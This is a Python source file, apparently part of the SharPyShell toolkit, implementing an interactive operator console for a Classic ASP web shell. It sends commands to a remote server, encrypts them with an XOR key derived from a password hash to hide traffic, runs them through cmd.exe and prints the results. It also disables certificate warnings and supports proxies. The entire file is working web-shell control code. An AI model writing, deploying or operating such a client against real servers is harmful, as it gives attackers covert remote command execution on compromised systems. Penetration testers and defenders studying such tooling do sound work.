from cmd import Cmd
from core import config
import hashlib
import base64
import signal
import platform
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ASPPrompt(Cmd):
    prompt = "ASP> "
    doc_header = "Classic ASP Shell (cmd execution only)"

    def __init__(self, password, url, user_agent, cookies, custom_headers,
                 insecure_ssl, proxy):
        Cmd.__init__(self)
        password_bytes = password.encode('utf-8')
        self.password_hash = hashlib.sha256(password_bytes).hexdigest()
        self.url = url
        self.session = requests.Session()
        if user_agent and user_agent != 'default':
            self.session.headers['User-Agent'] = user_agent
        if cookies:
            for cookie in cookies.split(';'):
                k, _, v = cookie.strip().partition('=')
                self.session.cookies.set(k, v)
        if custom_headers:
            k, _, v = custom_headers.partition(':')
            self.session.headers[k.strip()] = v.strip()
        self.verify_ssl = insecure_ssl != 'true'
        self.proxies = None
        if proxy:
            self.proxies = {'http': proxy, 'https': proxy}

        if platform.system() == 'Windows':
            signal.signal(signal.SIGTERM, lambda s, f: self.do_quit())
        else:
            signal.signal(signal.SIGTSTP, lambda s, f: self.do_quit())

        self._test_connection()

    def _xor(self, data_bytes, key_str):
        key = key_str.encode('iso-8859-1')
        result = bytearray()
        for i, b in enumerate(data_bytes):
            result.append(b ^ key[i % len(key)])
        return bytes(result)

    def _send_command(self, command):
        encrypted = self._xor(command.encode('iso-8859-1'), self.password_hash)
        payload = base64.b64encode(encrypted).decode()
        resp = self.session.post(
            self.url,
            data={'data': payload},
            verify=self.verify_ssl,
            proxies=self.proxies,
            timeout=60,
        )
        if not resp.text:
            return ''
        decoded = base64.b64decode(resp.text)
        decrypted = self._xor(decoded, self.password_hash)
        return decrypted.decode('iso-8859-1', errors='replace')

    def _test_connection(self):
        try:
            result = self._send_command('echo SharPyShell_ASP_OK')
            if 'SharPyShell_ASP_OK' in result:
                print('[*] Classic ASP shell connected successfully')
            elif '{{{SharPyShellError}}}' in result:
                print('[!] Shell responded with error: ' + result)
            else:
                print('[!] Unexpected response - shell may not be working correctly')
                print('[!] Response: ' + result[:200])
        except requests.exceptions.RequestException as e:
            print('[!] Connection failed: ' + str(e))
            print('[!] Shell may be offline or URL is incorrect')

    def default(self, line):
        if not line:
            return
        try:
            result = self._send_command(line)
            if '{{{SharPyShellError}}}' in result:
                result = result.replace('{{{SharPyShellError}}}', '[Error] ')
            if result:
                if result.endswith('\n'):
                    result = result[:-1]
                print(result)
        except requests.exceptions.RequestException as e:
            print('[!] Request failed: ' + str(e))

    def do_help(self, arg):
        """List available commands."""
        print("\nClassic ASP Shell - Direct command execution")
        print("=" * 45)
        print("Type any command to execute via cmd.exe /c")
        print("\nBuilt-in commands:")
        print("  help    - Show this help")
        print("  quit    - Exit the shell")
        print("  exit    - Exit the shell")
        print("\nNote: This is a standalone cmd shell.")
        print("Modules (#exec_ps, #upload, etc.) are not available.\n")

    def do_quit(self, args=[]):
        """Quit the program."""
        print("\n\nQuitting...\n")
        raise SystemExit

    def do_exit(self, args=[]):
        """Exit the program."""
        self.do_quit()

    def cmdloop(self, intro=None):
        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey + ": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro) + "\n")
            stop = None
            while not stop:
                try:
                    if self.cmdqueue:
                        line = self.cmdqueue.pop(0)
                    else:
                        if self.use_rawinput:
                            try:
                                line = input(self.prompt)
                            except EOFError:
                                line = 'EOF'
                        else:
                            self.stdout.write(self.prompt)
                            self.stdout.flush()
                            line = self.stdin.readline()
                            if not len(line):
                                line = 'EOF'
                            else:
                                line = line.rstrip('\r\n')
                    if line == 'EOF':
                        raise EOFError()
                    stop = self.onecmd(line)
                except KeyboardInterrupt:
                    print("^C")
            self.postloop()
        except EOFError:
            self.do_quit()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass
